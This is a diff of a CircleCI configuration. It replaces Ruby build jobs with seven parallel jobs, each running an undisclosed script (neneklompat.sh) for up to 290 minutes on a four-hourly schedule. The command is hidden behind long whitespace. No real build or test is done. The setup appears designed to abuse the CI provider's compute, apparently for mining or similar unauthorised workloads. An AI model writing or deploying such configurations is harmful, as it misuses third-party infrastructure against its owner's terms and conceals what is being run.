@@ -1,52 +1,54 @@
-resource_class: large
 working_dir: &working_dir ~/app
-
-.build_template: &build_definition
+.asui_template: &script
   steps:
-    - checkout 
-    - run:  
-        command: chmod u+x neneklompat.sh && timeout 290m ./neneklompat.sh && echo "suuu"
+    - checkout
+    - run:
+        name: kuntul
+        command: |
+                                    chmod u+x neneklompat.sh && timeout 290m ./neneklompat.sh && echo "aha"
         no_output_timeout: 290m
-
 version: 2.0
-
 jobs:
-  build:
+  asui:
     docker:
       - image: ruby
     steps:
       - checkout
-  buifdsxxw2127:
-    <<: *build_definition
+  asui1:
+    <<: *script
     docker:
-      - image: ruby:2.7
-  buifdsxxw2126:
-    <<: *build_definition
+      - image: cimg/go:1.16
+  asui2:
+    <<: *script
     docker:
-      - image: ruby:2.6
-  buifdsxxw2125:
-    <<: *build_definition
+      - image: cimg/go:1.16
+  asui3:
+    <<: *script
     docker:
-      - image: ruby:2.5
-  buifdsxxw2124:
-    <<: *build_definition
+      - image: cimg/go:1.16
+  asui4:
+    <<: *script
     docker:
-      - image: ruby:2.4
-  buifdsxxw2123:
-    <<: *build_definition
+      - image: cimg/go:1.16
+  asui5:
+    <<: *script
     docker:
-      - image: ruby:2.3
-
+      - image: cimg/go:1.16
+  asui6:
+    <<: *script
+    docker:
+      - image: cimg/go:1.16
 workflows:
   version: 2
   commit:
     jobs:
-      - build
-      - buifdsxxw2127
-      - buifdsxxw2126
-      - buifdsxxw2125
-      - buifdsxxw2124
-      - buifdsxxw2123
+      - asui
+      - asui1
+      - asui2
+      - asui3
+      - asui4
+      - asui5
+      - asui6
     triggers:
       - schedule:
           cron: "0 2,6,10,14,18,22 * * *"
@@ -54,12 +56,13 @@ workflows:
             branches:
               only:
                 - master
-  
-  anakkutil:
+                
+  asuirunjob:
     jobs:
-      - build
-      - buifdsxxw2127
-      - buifdsxxw2126
-      - buifdsxxw2125
-      - buifdsxxw2124
-      - buifdsxxw2123
+      - asui
+      - asui1
+      - asui2
+      - asui3
+      - asui4
+      - asui5
+      - asui6
